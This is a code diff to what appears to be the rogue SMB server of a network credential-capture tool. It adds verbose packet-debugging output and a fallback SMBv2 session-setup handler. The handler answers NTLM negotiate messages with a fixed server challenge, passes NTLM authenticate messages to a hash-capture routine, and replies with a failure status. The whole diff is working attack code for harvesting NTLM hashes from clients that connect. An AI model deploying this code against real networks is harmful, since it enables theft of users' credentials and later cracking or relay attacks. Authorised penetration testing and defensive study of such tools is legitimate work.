@@ -474,6 +474,25 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 						data = self.request.recv(1024)
 						if settings.Config.Verbose:
 							print(color("[+] SMB2: Sent SMBv2 negotiate response to SMBv1 client, received %d bytes" % len(data), 3))
+							# Debug: Check what's in the received packet
+							if len(data) >= 4:
+								smb_version = data[4:5]
+								if smb_version == b'\xfe':
+									print(color("[+] SMB2: Received SMBv2 packet (version 0xfe)", 3))
+								elif smb_version == b'\xff':
+									print(color("[+] SMB2: Received SMBv1 packet (version 0xff)", 3))
+								else:
+									print(color("[+] SMB2: Received unknown SMB version: 0x%02x" % ord(smb_version), 3))
+							
+							if len(data) >= 10:
+								command = data[8:10]
+								print(color("[+] SMB2: Received command: 0x%02x%02x" % (command[0], command[1]), 3))
+							
+							if len(data) >= 20:
+								structure_size = data[16:18]
+								print(color("[+] SMB2: Structure size: 0x%02x%02x" % (structure_size[0], structure_size[1]), 3))
+							
+							print(color("[+] SMB2: Full packet: %s" % repr(data[:100]), 3))
 					except Exception as e:
 						if settings.Config.Verbose:
 							print(color("[!] SMB2: Error in SMBv2 negotiate from SMBv1: %s" % str(e), 1))
@@ -586,6 +605,104 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 					else:
 						if settings.Config.Verbose:
 							print(color("[+] SMB2: Session setup packet too short", 3))
+						break
+
+				# Fallback: Handle any SMBv2 session setup packet that might not match the above conditions
+				elif data[4:5] == b"\xfe" and len(data) > 20:
+					if settings.Config.Verbose:
+						print(color("[+] SMB2: Fallback handling for SMBv2 packet", 3))
+						print(color("[+] SMB2: Command: 0x%02x%02x, Structure size: 0x%02x%02x" % (data[8], data[9], data[16], data[17]), 3))
+					
+					# Check if this looks like a session setup packet
+					if data[8:10] == b"\x01\x00" or (len(data) > 50 and struct.unpack('<H', data[50:52])[0] > 0):
+						if settings.Config.Verbose:
+							print(color("[+] SMB2: Detected SMBv2 session setup in fallback", 3))
+						
+						# Try to extract security buffer
+						if len(data) > 54:
+							security_buffer_offset = struct.unpack('<H', data[50:52])[0]
+							security_buffer_length = struct.unpack('<H', data[52:54])[0]
+							
+							if security_buffer_length > 0 and security_buffer_offset < len(data):
+								security_buffer = data[security_buffer_offset:security_buffer_offset + security_buffer_length]
+								
+								if settings.Config.Verbose:
+									print(color("[+] SMB2: Fallback - Security buffer length: %d" % security_buffer_length, 3))
+									print(color("[+] SMB2: Fallback - Security buffer: %s" % repr(security_buffer[:50]), 3))
+								
+								# Check for NTLM messages
+								if b'NTLMSSP' in security_buffer:
+									ntlm_offset = security_buffer.find(b'NTLMSSP')
+									if ntlm_offset >= 0 and ntlm_offset + 8 < len(security_buffer):
+										message_type = struct.unpack('<L', security_buffer[ntlm_offset+8:ntlm_offset+12])[0]
+										if settings.Config.Verbose:
+											print(color("[+] SMB2: Fallback - NTLM message type: 0x%02x" % message_type, 3))
+										
+										if message_type == 0x01:  # NTLM negotiate
+											if settings.Config.Verbose:
+												print(color("[+] SMB2: Fallback - NTLM negotiate message detected", 3))
+											# Send challenge
+											head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), SessionID=GrabSessionID(data).decode('latin-1'),NTStatus="\x16\x00\x00\xc0")
+											t = SMB2Session1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
+											t.calculate()
+											packet1 = str(head)+str(t)
+											buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
+											try:
+												self.request.send(NetworkSendBufferPython2or3(buffer1))
+												data = self.request.recv(1024)
+												if settings.Config.Verbose:
+													print(color("[+] SMB2: Fallback - Sent session setup challenge, waiting for auth", 3))
+											except Exception as e:
+												if settings.Config.Verbose:
+													print(color("[!] SMB2: Fallback - Error in SMBv2 session setup: %s" % str(e), 1))
+												break
+										elif message_type == 0x03:  # NTLM authenticate
+											if settings.Config.Verbose:
+												print(color("[+] SMB2: Fallback - NTLM authenticate message detected", 3))
+											# Parse and capture the hash
+											ParseSMBHash(security_buffer, self.client_address[0], Challenge)
+											
+											# Send success response
+											if settings.Config.ErrorCode:
+												ntstatus="\x6d\x00\x00\xc0"
+											else:
+												ntstatus="\x22\x00\x00\xc0"
+											head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), NTStatus=ntstatus, SessionID=GrabSessionID(data).decode('latin-1'))
+											t = SMB2Session2Data()
+											packet1 = str(head)+str(t)
+											buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
+											try:
+												self.request.send(NetworkSendBufferPython2or3(buffer1))
+												data = self.request.recv(1024)
+												if settings.Config.Verbose:
+													print(color("[+] SMB2: Fallback - Sent session setup response", 3))
+											except Exception as e:
+												if settings.Config.Verbose:
+													print(color("[!] SMB2: Fallback - Error in SMBv2 session setup response: %s" % str(e), 1))
+												break
+										else:
+											if settings.Config.Verbose:
+												print(color("[+] SMB2: Fallback - Unknown NTLM message type: 0x%02x" % message_type, 3))
+											break
+									else:
+										if settings.Config.Verbose:
+											print(color("[+] SMB2: Fallback - Invalid NTLM message structure", 3))
+										break
+								else:
+									if settings.Config.Verbose:
+										print(color("[+] SMB2: Fallback - No NTLMSSP in security buffer", 3))
+									break
+							else:
+								if settings.Config.Verbose:
+									print(color("[+] SMB2: Fallback - Invalid security buffer", 3))
+								break
+						else:
+							if settings.Config.Verbose:
+								print(color("[+] SMB2: Fallback - Session setup packet too short", 3))
+							break
+					else:
+						if settings.Config.Verbose:
+							print(color("[+] SMB2: Fallback - Not a session setup packet", 3))
 						break
 
 				# Fall back to SMBv1 handling for compatibility (following original SMB1 pattern)
